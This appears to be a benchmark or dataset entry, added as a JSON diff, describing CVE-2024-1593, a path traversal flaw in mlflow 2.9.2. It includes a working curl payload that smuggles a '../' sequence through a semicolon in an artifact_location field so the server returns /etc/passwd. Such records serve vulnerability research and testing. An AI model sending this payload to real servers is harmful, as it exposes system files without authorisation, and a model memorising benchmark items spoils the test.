@@ -1,0 +1,15 @@
+{
+  "file_id": "179_mlflow_huntr_dbdc6bd6-d09a-46f2-9d9c-5138a14b6e31",
+  "numeric_id": "179",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal via smuggling path traversal sequences using ; in URL params",
+  "cve": "CVE-2024-1593",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "== 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc4\", \"artifact_location\": \"http://127.0.0.1:5000/;../../../../../etc/passwd\"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/model-versions/create'",
+  "oracle": "Server returns the content of /etc/passwd file"
+}
